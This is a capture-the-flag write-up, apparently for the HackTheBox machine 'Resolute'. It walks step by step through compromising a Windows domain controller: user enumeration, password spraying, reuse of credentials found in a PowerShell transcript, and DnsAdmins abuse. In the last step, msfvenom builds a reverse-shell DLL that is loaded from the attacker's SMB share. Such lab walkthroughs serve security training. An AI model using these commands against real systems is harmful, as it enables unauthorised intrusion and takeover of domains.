# Resolute

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.85.209     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 03:38 EDT
Nmap scan report for 10.129.85.209
Host is up (0.015s latency).
Not shown: 65512 closed tcp ports (conn-refused)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49684/tcp open  unknown
49733/tcp open  unknown
```

### User List + ASREP-Roast

Using `enum4linux` and null credentials, we can find a list of users and an interesting description:

{% code overflow="wrap" %}
```bash
$ enum4linux -u '' -p '' -a 10.129.85.209 # truncated output 
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]

Administrator 
Guest 
krbtgt 
DefaultAccount 
ryan 
marko 
sunita 
abigail 
marcus 
sally 
fred 
angela 
felicia 
gustavo 
ulf 
stevie 
claire 
paulo 
steve 
annette 
annika 
per 
claude 
melanie 
zach 
simon 
naoki 
```
{% endcode %}

We have a password lf `Welcome123!` and a username list, so password spraying with `crackmapexec` is next.&#x20;

```bash
$ crackmapexec smb 10.129.85.209 -u users -p 'Welcome123!'
SMB         10.129.85.209   445    RESOLUTE         [+] megabank.local\melanie:Welcome123!
```

We have a user `melanie` who has the weak password. We can login as this user using `evil-winrm`.

<figure><img src="../../../.gitbook/assets/image (2637).png" alt=""><figcaption></figcaption></figure>

Grab the user flag.

## Privilege Escalation

### PSTranscripts

Within the `C:\` directory, there are some hidden directories:

```
*Evil-WinRM* PS C:\> ls -force


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-         5/5/2023  12:55 AM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
d--hs-        9/25/2019  10:17 AM                Recovery
d--hs-        9/25/2019   6:25 AM                System Volume Information
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows
-arhs-       11/20/2016   5:59 PM         389408 bootmgr
-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
-a-hs-         5/5/2023  12:43 AM      402653184 pagefile.sys

*Evil-WinRM* PS C:\PSTranscripts> ls -force


    Directory: C:\PSTranscripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--h--        12/3/2019   6:45 AM                20191203
```

Within this file, there is a PowerShell transcript, which contains credentials.&#x20;

{% code overflow="wrap" %}
```
*Evil-WinRM* PS C:\PSTranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt

<TRUNACTED>
PS>CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="InputObject"; value="The syntax of this command is:"
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
```
{% endcode %}

With these credentials, we can login as `ryan`.&#x20;

<figure><img src="../../../.gitbook/assets/image (3321).png" alt=""><figcaption></figcaption></figure>

### DNS Admin

As `ryan`, we are part of the Contractors and FnsAdmins group:

```
*Evil-WinRM* PS C:\Users\ryan\desktop> whoami /all

USER INFORMATION
----------------

User Name     SID
============= ==============================================
megabank\ryan S-1-5-21-1392959593-3013219662-3596683436-1105


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

Also, there's a note within the desktop:

{% code overflow="wrap" %}
```
*Evil-WinRM* PS C:\Users\ryan\desktop> cat note.txt
Email to team:

- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
```
{% endcode %}

This means that we have control over DNS and can change the DLL file with a reverse shell. We should also be able to start and stop the service.

We can use this guide to get a SYSTEM shell.

{% embed url="https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/" %}

First, let's create a reverse shell DLL file via `msfvenom`. Afterwards, we need to host it using `smbserver.py`.&#x20;

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.13 LPORT=443 -f dll -o shell.dll
smbserver.py share . -smb2support
```

Then, following the PoC, we can use `dnscmd` to set the server to use our DLL over SMB and restart the service to get a SYSTEM shell:

```
dnscmd 127.0.0.1 /config /serverlevelplugindll \\10.10.14.13\share\shell.dll
sc.exe stop dns
sc.exe start dns
```

<figure><img src="../../../.gitbook/assets/image (2608).png" alt=""><figcaption></figcaption></figure>
